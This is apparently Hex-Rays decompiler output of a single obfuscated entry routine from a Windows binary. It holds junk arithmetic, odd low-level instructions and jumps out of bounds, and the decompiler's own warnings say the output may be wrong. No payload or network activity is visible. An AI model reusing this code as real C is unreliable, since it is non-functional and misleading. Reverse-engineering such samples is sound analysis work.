/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

// __int16 __usercall start@<ax>(int@<eax>, unsigned int _EDX@<edx>, int@<ebx>, int _EBP@<ebp>, int _EDI@<edi>);

//-------------------------------------------------------------------------
// Data declarations

_UNKNOWN loc_407CB9; // weak


//----- (00406C9E) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
__int16 __usercall start@<ax>(int a1@<eax>, unsigned int _EDX@<edx>, int a3@<ebx>, int _EBP@<ebp>, int _EDI@<edi>)
{
  unsigned int v9; // ebx
  char v16; // cl
  _BYTE *v17; // edi
  unsigned int v19; // ebx
  unsigned int v20; // ett
  int v25; // edx
  bool v27; // cf
  int v28; // edx
  __int16 v31; // ax
  int v35; // ebx
  int v36; // esi
  char v38; // cl
  unsigned int v39; // edx
  int v41; // edx
  unsigned int v42; // eax
  unsigned int v46; // edx
  unsigned int v47; // ett
  char v48; // ah
  int v50; // esi
  _BYTE *v51; // edi
  int v54; // eax
  __int16 v55; // ax
  int v57; // ecx
  char v66; // cl
  char v68; // bl
  bool v69; // cf
  int v70; // edi
  char v74; // cl
  int v77; // edi
  unsigned int v79; // ebx
  unsigned int v82; // eax
  char v88; // cl
  unsigned int v89; // edi
  int v90; // esi
  int v93; // esi
  unsigned int v95; // esi
  unsigned int v96; // ett
  unsigned int v97; // esi
  unsigned int v98; // ecx
  int v100; // esi
  int v101; // ebx
  int v102; // ebx
  int v103; // eax
  unsigned int v104; // edx
  char v108; // cl
  bool v109; // cf
  bool v110; // tt
  int v115; // esi
  unsigned int v117; // ebx
  __int16 v118; // ax
  __int16 v124; // ax
  bool v125; // tt
  char v127; // bl
  int v130; // ecx
  bool v131; // tt
  char v134; // dl
  char v135; // dh
  int v136; // esi
  unsigned int v140; // ett
  unsigned int v144; // esi
  __int16 v145; // ax
  unsigned int v146; // ecx
  unsigned __int16 v149; // dx
  int v150; // ecx
  char v154; // al
  char v155; // tt
  unsigned int v158; // [esp-1Ch] [ebp-1Ch]
  int v159; // [esp-18h] [ebp-18h] BYREF

  _CF = __CFADD__(a3, -418751930);
  v117 = a3 - 418751930;
  LOBYTE(v117) = -98;
  BYTE1(_EDX) = ~(BYTE1(_EDX) | 0xD1);
  LOBYTE(_EDX) = BYTE1(a1) + _CF + _EDX + 92;
  _ECX = 1080936123;
  v35 = (v117 >> 18) & 0x2D443790;
  BYTE1(v35) &= 0x25u;
  HIWORD(v36) = 713;
  BYTE1(_ECX) = BYTE1(v35) | 0xC6;
  LOWORD(a1) = (unsigned __int8)__ROR1__(a1, 28);
  _CF = __CFSHL__(v35, 11);
  _EBX = v35 << 11;
  __asm { rcl     edi, cl }
  v140 = _CF + a1;
  _CF = _ECX < v140;
  _ECX = _ECX - v140;
  LOBYTE(_ECX) = BYTE1(_EDX) + _CF + _ECX;
  _EAX = a1 >> _ECX;
  LOWORD(v36) = 0;
  __asm { rcr     bh, 3 }
  LOBYTE(_EAX) = _EAX + 1;
  v124 = _EAX - 1;
  _ESI = __ROL4__(v36, _ECX);
  LOWORD(_EDI) = (__int16)_EDI >> _ECX;
  LOBYTE(_EAX) = 0;
  v125 = __CFSHR__(HIBYTE(v124), 7);
  BYTE1(_EAX) = __ROR1__(HIBYTE(v124), 7);
  _EBX = v125 + _EBX + 1713665013;
  if ( _EDX != 1588038078 )
  {
    LOBYTE(_EAX) = __ROL1__(0, _ECX);
    __asm { rcr     cl, cl }
    LOBYTE(_EBX) = BYTE1(_EDX) + __CFSHR__(_EBX, 6) + ((char)_EBX >> 6);
    BYTE1(_EAX) = __ROR1__(BYTE1(_EAX), _ECX);
    LOWORD(_EDI) = __ROL2__(_EDI, _ECX);
    __asm { rcr     ch, 15h }
    LOWORD(_EAX) = (_WORD)_EAX << _ECX;
    goto LABEL_52;
  }
  __asm { rcl     edi, 0Eh }
  if ( _EAX )
    return _EAX;
  BYTE1(_EDX) = 32;
  LOWORD(_EDI) = _EDX + _EDI;
  v127 = _EBX + 1;
  __asm { rcr     cx, cl }
  LOBYTE(_EDX) = __ROL1__(-66, _ECX);
  __asm { rcl     ch, 1Eh }
  LOBYTE(_ECX) = ~(_ECX + 7);
  _CF = _ECX < _EDX;
  _ECX = _ECX - _EDX;
  LOBYTE(_EDX) = v127 + _CF + _EDX;
  if ( _ESI == 1751500890 )
  {
    __asm { fisttp  word ptr [edx-28h] }
    LOWORD(_EAX) = _EAX + 7247;
    return _EAX;
  }
  _BL = v127 & 0xB6;
  __asm { rcl     bl, cl }
  LOWORD(_ECX) = (unsigned __int8)(_ECX - __CFSHL__(-88, _ECX));
  _EBX = _ESI;
  __asm { rcl     ch, cl }
  if ( _ESI == 536972193 )
    JUMPOUT(0x4069D4);
  _ECX = __ROL4__(_ECX, 10);
  __asm { int     2Eh; DOS 2+ internal - EXECUTE COMMAND }
  _CF = __CFSHR__(BYTE1(_ECX), _ECX);
  SBYTE1(_ECX) >>= _ECX;
  LOWORD(_ECX) = _ECX - 1;
  LOBYTE(_ECX) = _ECX - (_CF - 82);
  v68 = _ESI - 31;
  __asm { rcr     ch, 14h }
  LOWORD(_EDI) = _ESI ^ _EDI;
  v69 = _EDI < 0xACA83C23;
  if ( _EDI == -1398260701 )
  {
    LOWORD(_EDX) = _EAX;
    LOBYTE(_EBX) = _ESI - 32;
    HIWORD(v70) = -21336;
    LOWORD(v70) = _ESI + v69 + 15396;
    _EBX = _EBX >> 3;
    LOBYTE(_EAX) = -30;
    LOBYTE(_ECX) = _ECX + 44;
    __asm
    {
      rcl     bh, 1Bh
      rcl     esi, 0Fh
    }
    BYTE1(_EAX) = (_EBX & 0xED) - 79 - (__CFSHL__(_ESI, _ECX) + 34);
    _EDI = v70 ^ 0x5D65BC9D;
    LOBYTE(_EBX) = (_ESI << _ECX) + __ROR1__(_EBX - (__CFADD__(_EBX & 0xED, -79) + BYTE1(_EDX)), _ECX);
    BYTE1(_ECX) = BYTE1(_EDX);
    goto LABEL_13;
  }
  v144 = _ECX + _ESI;
  LOBYTE(_EBX) = _ECX | BYTE1(_EAX) | v68;
  LOWORD(_EDI) = _EAX;
  BYTE1(_ECX) &= BYTE1(_EAX);
  LOBYTE(_EAX) = MEMORY[0xFFFFFFFF];
  if ( _EAX == -1073741778 )
  {
    _ESI = v144 >> 22;
    LOBYTE(_EBX) = _EBX + 26;
    v25 = __ROR4__(0, 11);
    _EDI = _ECX + __ROL4__(_EDI, 10);
    LOBYTE(_ECX) = 8 * _ECX;
    LOBYTE(_EAX) = __ROR1__(46, 13);
    LOWORD(_ECX) = _ECX - (__CFSHR__(46, 13) + (_WORD)_EAX);
    v27 = __CFADD__(_EAX, v25);
    v28 = _EAX + v25;
    __asm { rcr     ecx, 1Ah }
    v41 = v27 + v28 + 1395768536;
    LOBYTE(_ECX) = (_EBX + __ROL1__(_ECX, 6)) | 0xF8;
    BYTE1(_EBX) = -24;
    if ( _EBX == 1461557497 )
    {
      _enable();
      __outdword(v41, _EAX);
      _CF = _EAX < 0xF3C050ED;
      v42 = _EAX + 205500179;
      _OF = __OFSUB__(MEMORY[0x571D98F9], _CF + _EBP);
      MEMORY[0x571D98F9] -= _CF + _EBP;
      __asm { fild    word ptr [ebp+esi*8-253F06CDh] }
      if ( !_OF )
      {
        LOWORD(_ESI) = v41 ^ _ESI;
        _ECX = _ECX & 0xFD002C21;
        __asm { rcl     si, cl }
        LOBYTE(_ECX) = v42 & _ECX;
        _CF = __CFSHL__(_EBX, _ECX);
        LOBYTE(_EBX) = (_BYTE)_EBX << _ECX;
        BYTE1(_EBX) = 23;
        v96 = _CF + 246954820;
        _CF = _ESI < v96;
        v95 = _ESI - v96;
        LOBYTE(v96) = _CF - 60;
        _CF = BYTE1(v41) < (unsigned __int8)(_CF - 60);
        BYTE1(v41) -= v96;
        LOBYTE(_ECX) = _EBX + _CF + _ECX;
        __asm { rcr     bh, cl }
        BYTE1(_EBX) = (v41 ^ BYTE1(_EBX)) + 54;
        BYTE1(_ECX) += _ECX + 100;
        v46 = v41 + 1;
        LOBYTE(_ECX) = __ROL1__(_ECX, _ECX);
        _CF = __CFADD__((_BYTE)v46, BYTE1(_EBX));
        BYTE1(_EBX) += v46;
        v47 = _CF + 411039263;
        _CF = v46 < v47;
        v104 = v46 - v47;
        LOWORD(_EBX) = ~(_WORD)_EBX;
        v101 = _EBX - ((__CFADD__(_CF, (_WORD)_EDI) | __CFADD__((_WORD)v104, _CF + (_WORD)_EDI)) + v95);
        _CF = __CFSHL__(BYTE1(_ECX), _ECX);
        BYTE1(_ECX) <<= _ECX;
        __asm { rcl     ecx, 13h }
        v102 = v101 - (_CF + 838257751) + 1072945174;
        v103 = *(_DWORD *)(**(_DWORD **)(v42 + 144) + 8);
        BYTE1(v104) = (_BYTE)v104 << _ECX;
        LOBYTE(v104) = _ECX & v104;
        __asm
        {
          rcr     ecx, 0Ch
          rcr     cl, cl
        }
        v38 = (unsigned __int8)(_CL ^ 0x4E) >> (_CL ^ 0x4E);
        LOBYTE(v104) = (unsigned __int8)v104 >> v38;
        v39 = v104 << v38;
        _CL = v103 & 0xEE | v38;
        if ( v39 == -2105114849 )
        {
          __asm { into }
          JUMPOUT(0x40662A);
        }
        _EBX = -v102;
        __asm { rcl     bh, cl }
        JUMPOUT(0x406C78);
      }
      JUMPOUT(0xCA62945C);
    }
    v115 = __ROR4__(_ESI, 13);
    _EAX = 3;
    LOBYTE(_ECX) = _ECX ^ 0x40;
    if ( _ECX == -42209460 )
      __asm { retf    0BAC6h }
    __asm { rcl     ch, cl }
    BYTE1(_ECX) = 0;
    __asm { rcr     cl, 16h }
    _ESI = __ROR4__(v115, 2);
    LOWORD(_EDX) = 11984 - _EDI;
    LOBYTE(_ECX) = -50;
    if ( _ESI != 2083654049 )
      JUMPOUT(0x406E36);
    __asm
    {
      fild    word ptr [ecx+0E0F73C8h]
      aas
    }
    LOBYTE(_ECX) = -50 - (__CFADD__(MEMORY[0x7C3209B4], &v159) + 75);
    BYTE1(_ECX) -= _EAX;
    _EBX = _EDI;
    ++_EAX;
    LOBYTE(_EBX) = _ECX ^ _EDI;
    _CF = (unsigned __int16)_ECX < (unsigned __int16)_EBX;
    LOWORD(_ECX) = _ECX - _EBX;
    LOBYTE(_EAX) = _ECX + _CF + _EAX;
    LOBYTE(_EBX) = __ROR1__(_EBX, _ECX);
    LOBYTE(_ECX) = 0;
    _EAX = _EBX + _EAX;
    __asm { rcr     ah, cl }
    goto LABEL_65;
  }
  LOBYTE(_ECX) = __ROR1__(_ECX, 13);
  _EDX = -1473532666;
  BYTE1(_EBX) = -7;
  if ( _ECX != -846550467 )
  {
    LOWORD(_EAX) = _ECX + __CFSHR__(_EDI, 8) + (_WORD)_EAX;
    return _EAX;
  }
  *(_DWORD *)(_EAX - 846550467) += _EBP;
  _EAX = _EAX - 561353390;
  __asm { rcr     ch, cl }
  LOBYTE(_EAX) = _EAX + 7;
  _ECX = _ECX - 1828089592;
  __asm { rcr     edi, 1Eh }
  _CF = _EBX < _EDI;
  _EBX = _EBX - _EDI;
  BYTE1(_EAX) = _EAX + _CF + __ROL1__(0, 14);
  if ( v144 == -646030763 )
  {
    __asm { xlat }
    __indword(0xAD06u);
    JUMPOUT(0x7060F92F);
  }
  BYTE1(_EAX) = -BYTE1(_EAX);
  __asm { rcr     al, 8 }
  LOBYTE(_EAX) = -36;
  v66 = (BYTE1(_EAX) != 0) + _ECX + 20;
  _ESI = v144 >> 14;
  BYTE1(_EBX) = __ROR1__(SBYTE1(_EBX) >> v66, v66);
  BYTE1(_EAX) <<= v66;
  __asm { rcl     al, 0Eh }
  v82 = _EAX - 1;
  LOBYTE(v82) = v82 - 83;
  BYTE1(v82) |= BYTE1(_EBX);
  _CL = v66 + 13;
  __asm { rcr     cl, 17h }
  _CL -= 6;
  _EAX = __ROL4__(v82, _CL);
  _EDI = __ROR4__(_EDI - 1, 27);
  LOWORD(_EBX) = _EDI & _EBX;
  LOBYTE(_ECX) = _CL >> 7;
  if ( _EDI == 111752009 )
  {
    __asm { outsb }
    _CL = (char)_ECX >> 7;
    __asm { rcl     ah, cl }
    JUMPOUT(0x40634A);
  }
  __asm { rcl     ah, cl }
  LOWORD(_ECX) = (unsigned __int8)(_EBX + _ECX);
  _EBX = _EBX >> 22;
  LOBYTE(_EBX) = __ROL1__(_EBX + 56, _ECX);
  _EBX >>= 26;
  LOWORD(_ESI) = _ESI + 2;
  __asm
  {
    rcr     edi, 7
    rcr     edi, 0Ch
    rcr     si, cl
  }
  _CF = __CFADD__(_ECX, _EAX);
  v54 = _ECX + _EAX;
  BYTE1(_EBX) += 117;
  BYTE1(_ECX) = -1;
  LOBYTE(_ECX) = BYTE1(v54) + (_ECX ^ 0xBF);
  LOBYTE(_EBX) = _CF + _EBX + 1;
  _ECX = _ECX - _EDI;
  --_EBX;
  BYTE1(_ECX) += 42;
  __asm { rcr     bl, cl }
  LOBYTE(_ECX) = 2 * _ECX;
  LOWORD(_ECX) = (unsigned __int16)_ECX >> _ECX;
  __asm { rcr     cx, cl }
  LOBYTE(_ECX) = -(char)_ECX;
  v93 = _ESI - _ECX;
  SBYTE1(_ECX) >>= _ECX;
  _EAX = v54 >> _ECX;
  HIWORD(_EDI) = 20914;
  BYTE1(_EAX) += _EAX;
  _ESI = (v93 - 1) ^ 0xF4E257FB;
  _CF = __CFADD__((_BYTE)_ECX, BYTE1(_ECX));
  BYTE1(_ECX) += _ECX;
  __asm { rcl     eax, 0Ch }
  LOBYTE(_EBX) = _CF + _EBX + 30;
  __asm
  {
    rcr     bh, cl
    rcr     bh, cl
  }
  LOBYTE(_EAX) = (unsigned __int8)_EAX >> 1;
  LOWORD(_EDI) = ((unsigned __int16)_EAX > 0x7C2u) + 1986;
  LOBYTE(_EAX) = BYTE1(_ECX)
               + __CFSHL__(_EDI, _ECX)
               + BYTE1(_EBX)
               + (__CFADD__((unsigned __int16)_EAX > 0x7C2u, 1986 - _EAX) | __CFADD__(
                                                                              (_WORD)_EAX,
                                                                              ((unsigned __int16)_EAX > 0x7C2u)
                                                                            + 1986
                                                                            - _EAX))
               + _EAX;
  BYTE1(_ECX) = __ROL1__(BYTE1(_ECX), 24);
  v77 = __ROR4__(_EDI << _ECX, _ECX);
  __asm
  {
    rcl     ecx, cl
    rcl     ebx, 1Ch
  }
  BYTE1(_EBX) -= 16;
  v79 = 32 * _EBX;
  BYTE1(v79) = v79;
  _EDI = v79 + v77;
  BYTE1(_ECX) ^= BYTE1(_EAX) ^ 0x44;
  _EBX = v79 >> _ECX;
  LOBYTE(_EBX) = _EBX - 107;
  _EAX = _EAX >> 28;
  BYTE1(_ECX) = __ROR1__(BYTE1(_ECX), _ECX);
  _ECX = _ECX - 1;
  if ( _ECX == -1258169425 )
  {
LABEL_13:
    LOBYTE(_ECX) = __ROR1__(_ECX, 18) - (__CFSHL__(_EBX, 10) + BYTE1(_EAX));
    __asm { rcl     ch, 1 }
    _BH = 54;
    _EDI = (((_EDI - (__CFSHR__(_ECX, 27) + 719300346)) | 0xC8157BFA) << 28) & 0x1DC955C7;
    __asm { rcl     bh, 3 }
    _CL = _EAX ^ __ROL1__(-122, 134);
    __asm { rcr     di, cl }
    ++_CL;
    _DX = -(__int16)_EDX;
    __asm
    {
      rcl     dl, cl
      rcr     edi, 0Ch
    }
    JUMPOUT(0x406654);
  }
  while ( 1 )
  {
    LOWORD(_EAX) = _ECX + _EAX;
    v74 = ~((_BYTE)_ECX << 6);
    BYTE1(_EBX) += _EAX + 78;
    LOBYTE(_EAX) = (_BYTE)_EAX << v74;
    LOBYTE(_EBX) = -(char)(_EBX + 1);
    if ( _EDX != -1371927609 )
      JUMPOUT(0x4063B6);
    _EAX += 411410138;
LABEL_52:
    _ESI ^= 0xB94B065E;
    _EAX = -_EAX;
    LOBYTE(_EBX) = (char)_EBX >> 7;
    v108 = _EBX + v74;
    v110 = __CFSHL__(_EBX, v108);
    _EBX = __ROL4__(_EBX, v108);
    v109 = v110;
    LOWORD(_ECX) = _EBX;
    v130 = v109 + _ECX + 904503642;
    v131 = __CFSHL__(BYTE1(_EBX), v130);
    BYTE1(_EBX) = __ROL1__(BYTE1(_EBX), v130);
    __asm { rcl     eax, 10h }
    _EDI = _EDI - (v131 - 1222952339);
    LOBYTE(_EAX) = _EAX - 1;
    _ECX = _ESI & v130;
    __asm { rcl     bx, cl }
    if ( _EDI != -1663164131 )
      JUMPOUT(0x406A06);
    _EAX = _EAX ^ 0xC1817940;
    __asm { fimul   word ptr [ebp-2Eh] }
    if ( _ECX )
      break;
LABEL_65:
    LOWORD(_EBX) = (unsigned __int16)_EBX >> _ECX;
    LOBYTE(_ECX) = 0;
    _EDI = _EDI - 1952815945;
    ++BYTE1(_ECX);
    _ECX = _ECX - 222565242;
    BYTE1(_EAX) >>= _ECX;
    __asm { rcl     edi, 6 }
    if ( _EBX != 1842043702 )
    {
      __asm { rcl     al, cl }
      v55 = __ROL2__(_EAX, _ECX);
      _EBX = -153489617;
      HIBYTE(v55) -= 62;
      LOBYTE(_EBX) = __ROL1__(47, _ECX);
      HIWORD(_ECX) = 31777;
      __asm { rcl     bl, 0Ah }
      LOWORD(_EDI) = _EDX & _EDI;
      _EBX += 797840180;
      LOWORD(_ESI) = ~(_WORD)_ESI;
      __asm { rcr     bl, 7 }
      LOBYTE(_EBX) = __ROL1__(_EBX, 206);
      BYTE1(_EBX) = _EBX | ~BYTE1(_EBX);
      _EBX <<= 14;
      _CF = _EDI < 0x7C2132CE;
      _EDI = _EDI - 2082550478;
      LOBYTE(_EAX) = _EBX + _CF + ((char)~(HIBYTE(v55) & BYTE1(_EDX) & v55) >> 7);
      BYTE1(_EAX) = HIBYTE(v55) ^ 0x12;
      __asm { rcl     edi, 13h }
      BYTE1(_EBX) = __ROR1__(BYTE1(_EBX), 206) - (__CFSHR__(_EBX, 27) - 126);
      LOBYTE(_EBX) = 0;
      _EBX = _EBX + 2082550272;
      _ESI = ~_ESI;
      v48 = (unsigned __int8)(_EDX ^ BYTE1(_EAX)) >> (((unsigned __int16)(_EDX ^ 0x3200) >> 8) + _EDX);
      BYTE1(_ECX) = -(BYTE1(_EDX) ^ 0x32);
      __asm { rcr     esi, 8 }
      LOBYTE(_ECX) = -64;
      if ( _ESI != -1159063194 )
      {
        BYTE1(_ECX) = __ROR1__(BYTE1(_ECX), 2);
        __asm { rcl     ecx, 0Dh }
        _ECX = (_ECX - 577500472) << 11;
        LOWORD(_EBX) = (unsigned __int8)(BYTE1(_EDX) + _EBX);
        BYTE1(_EAX) = __ROL1__(v48, 28);
        if ( _ESI == -801884957 )
        {
          __asm
          {
            insb
            xlat
          }
          JUMPOUT(0x406C5E);
        }
        _BL = _EBX & 0x99;
        __asm { rcl     bl, 4 }
        BYTE1(_ECX) <<= _ECX;
        BYTE1(_EAX) = BYTE1(_ECX) | ~BYTE1(_EAX);
        LOBYTE(_ECX) = _ECX - _EAX;
        __asm { rcr     eax, cl }
        _ECX = _ECX & 0x97A53915;
        BYTE1(_EAX) = BYTE1(_EDX);
        __asm
        {
          rcr     ah, 9
          rcl     ecx, 17h
        }
        JUMPOUT(0x406814);
      }
      v50 = -1159063193;
      v51 = (_BYTE *)(_EDI - 1);
      __asm { rcl     ecx, 6 }
LABEL_74:
      _EAX = ((int (*)(void))loc_407CB9)();
      if ( v150 + 1 >= 0 )
      {
        __asm { rep adc eax, 0DC760ED9h }
        _EAX = (__int16)_EAX;
        LOBYTE(_EAX) = __inbyte(v149);
        __debugbreak();
      }
      HIBYTE(v149) = 39;
      __outdword(v149, _EAX);
      v155 = _EAX;
      v154 = *(_BYTE *)(_EBP - 1258751752);
      *(_BYTE *)(_EBP - 1258751752) = v155;
      *v51 = v154;
      _ESI = v50 + 4;
      __asm { fisttp  word ptr [esi-0Eh] }
      JUMPOUT(0x406FB1);
    }
    _EDX = v158;
    _EBP = 769694688 * _ESI;
  }
  v118 = (*(int (**)(void))_EAX)();
  LOBYTE(_ECX) = _ECX + 122;
  LOBYTE(_EBX) = v134;
  BYTE1(_EBX) = v134 + v135;
  _EDX = 0;
  __asm { rcr     cl, 1Bh }
  _ECX = _ECX ^ 0x641D0CB0;
  _EBX = _EBX >> 16;
  LOBYTE(_EBX) = HIBYTE(v118) ^ _EBX;
  __asm { rcl     bx, cl }
  BYTE1(_EBX) ^= 0x8Fu;
  __asm { rcr     esi, 2 }
  __GS__ = v118;
  LOBYTE(_EBX) = _ESI + __CFSHR__((unsigned __int16)(v118 | _EBX) >> 8, 30) + (v118 | _EBX);
  while ( 1 )
  {
    BYTE1(_EBX) = -32;
    LOWORD(_ECX) = _EBX;
    HIWORD(_EBX) = 8619;
    v136 = _EDX << _EBX;
    v98 = __ROR4__(_ECX, _EBX);
    __asm { rcr     edi, 17h }
    LOBYTE(_EBX) = v98 | 0x28;
    LOWORD(v98) = v118 + v98;
    v97 = v136 | 0x8985F964;
    BYTE1(_EBX) = 8;
    v51 = (_BYTE *)((v98 & _EDI) >> 1 << 11);
    LOWORD(v98) = _EDX ^ v98;
    LOBYTE(_EBX) = _EBX | 0xF1;
    LOWORD(_EBX) = v97 ^ _EBX;
    v100 = __ROL4__(v97, v98);
    if ( v98 == -1808224032 )
    {
      __indword(_EDX);
      __asm { fisubr  word ptr [ebx+0Ch] }
      JUMPOUT(0x406B78);
    }
    HIBYTE(v145) = __GS^1__;
    BYTE1(_EBX) >>= 1;
    v50 = __ROL4__(v100, __ROL1__(((char)v98 >> 7) - 1, 28));
    LOBYTE(v98) = 0;
    LOWORD(v50) = __GS__ ^ v50;
    LOBYTE(_EBX) = _EBX - BYTE1(_EDX);
    BYTE1(v98) ^= _EBX;
    v146 = HIBYTE(v98);
    if ( _EBX == 2025356729 )
    {
      *(_DWORD *)(_EBP + 1943211345) = ~*(_DWORD *)(_EBP + 1943211345);
      goto LABEL_74;
    }
    BYTE1(_EBX) |= _EDX;
    v9 = _EBX ^ 0x7DD1BC9;
    BYTE1(v146) = v146 ^ 0x43;
    _CX = (unsigned __int16)v146 >> v146;
    --HIBYTE(_CX);
    LOBYTE(_CX) = (char)_CX >> _CX;
    --BYTE1(v9);
    __asm
    {
      rcr     cx, cl
      rcl     ch, cl
    }
    ++_EDX;
    v16 = _CX ^ 0xF3;
    v17 = v51 - 719191587;
    _CF = __CFSHR__(BYTE1(v9), v16);
    SBYTE1(v9) >>= v16;
    v20 = _CF + 1799870838;
    _CF = v9 < v20;
    v19 = v9 - v20;
    v88 = v16 - BYTE1(_EDX);
    LOWORD(v17) = (__int16)v17 >> v88;
    BYTE1(v19) += v88;
    LOBYTE(v19) = (char)(BYTE1(_EDX) + BYTE1(_EDX) + _CF + v19) >> v88;
    v89 = ((_DWORD)v17 << 24) ^ 0xE81B7EB8;
    _CF = __CFSHL__(v50, v88);
    v90 = v50 << v88;
    LOBYTE(v19) = _CF + v19 + 113;
    if ( v19 == 1577103755 )
      JUMPOUT(0x406A59);
    _CL = 30;
    HIWORD(_ESI) = HIWORD(v90) | 0x7A6A;
    LOWORD(_ESI) = 0;
    __asm { rcr     esi, cl }
    if ( _EDX == 20013710 )
      break;
    _ECX = 0;
    __asm { rcl     cl, cl }
    if ( _ESI == -405505514 )
    {
      __inbyte(_EDX);
      __asm
      {
        fadd    dword ptr [edx-3Ch]
        outsd
        outsd
      }
      JUMPOUT(0x4066D2);
    }
    _EDI = v89 << 22;
    v57 = _ECX & 0x419AD8B8;
    BYTE1(v57) |= _EDX;
    _ECX = v57 << v57;
    _EBX = _EDX;
    v118 = __ROR4__(__GS__, 1);
    if ( !(__GS__ & 1) )
    {
      BYTE1(_ECX) = ~BYTE1(_ECX);
      __asm { rcr     si, cl }
      LOBYTE(_ECX) = __ROR1__(_ECX, _ECX) - 1;
      BYTE1(_EBX) = _EDX + BYTE1(_EDX);
      if ( _EBX == -537692461 )
        JUMPOUT(0x406CFB);
      _CL = __ROL4__(_ECX, _ECX) - 108;
      __asm { rcl     cl, cl }
      if ( _EDX == 1294811058 )
        JUMPOUT(0x406DEF);
      JUMPOUT(0x406722);
    }
  }
  _ECX = __ROL4__(556531742, 28);
  LOWORD(_ECX) = -(__int16)_ECX;
  __asm { rcr     ecx, 2 }
  LOBYTE(v145) = __GS__ << _ECX;
  v31 = v145 - _ECX;
  if ( _ECX == -1958131190 )
    JUMPOUT(0x40651B);
  LOBYTE(v31) = -23;
  LOWORD(_EAX) = v31 - v89;
  return _EAX;
}
// 406F27: positive sp value 1C has been found
// 40634C: inconsistent fpu stack
// 406519: control flows out of bounds to 40651B
// 406540: control flows out of bounds to 406541
// 406628: control flows out of bounds to 40662A
// 4066D1: control flows out of bounds to 4066D2
// 406750: control flows out of bounds to 406751
// 40685B: control flows out of bounds to 406861
// 4069D3: control flows out of bounds to 4069D4
// 406A58: control flows out of bounds to 406A59
// 406B75: control flows out of bounds to 406B78
// 406CF5: control flows out of bounds to 406CFB
// 406DEE: control flows out of bounds to 406DEF
// 406EB0: control flows out of bounds to 406EB1
// 406FAC: control flows out of bounds to 406FB1
// 406486: control flows out of bounds to 406814
// 406693: control flows out of bounds to 406C78
// 406ABC: control flows out of bounds to 406654
// 406341: control flows out of bounds to 406E36
// 406347: control flows out of bounds to 40633D
// 4065CA: control flows out of bounds to 40662D
// 40665F: control flows out of bounds to CA62945C
// 406BF4: control flows out of bounds to 4063B6
// 406C4D: control flows out of bounds to 406C5E
// 406C79: control flows out of bounds to 406C5B
// 406DE6: control flows out of bounds to 406722
// 406DEC: control flows out of bounds to 406E30
// 406E2D: control flows out of bounds to 406A06
// 406F1D: control flows out of bounds to 40634A
// 406628: conditional instruction was optimized away because edx.4==82867F1F
// 4067DD: conditional instruction was optimized away because edx.4 is in (==0|==A66EF5D9)
// 40685B: conditional instruction was optimized away because edx.4>=A82BAD06u
// 406EA6: conditional instruction was optimized away because edi.4==9CDE211D
// 406F1D: conditional instruction was optimized away because edx.4>=A82BAD06u
// 4067CF: conditional instruction was optimized away because edx.4 is in (==0|A82BAD06..F031E5F6|>=F031E5F8u)
// 40655B: conditional instruction was optimized away because edx.4 is in (==0|==A82BAD06)
// 40653D: conditional instruction was optimized away because ecx.4==B501DBAF
// 406C4D: conditional instruction was optimized away because esi.4==D03434E3
// 406BCD: variable 'v158' is possibly undefined
// 406E41: variable '_ECX' is possibly undefined
// 406E44: variable 'v134' is possibly undefined
// 406E53: variable 'v135' is possibly undefined
// 406F81: variable 'v150' is possibly undefined
// 406F8E: variable 'v149' is possibly undefined

// nfuncs=1 queued=1 decompiled=1 lumina nreq=0 worse=0 better=0
// ALL OK, 1 function(s) have been successfully decompiled
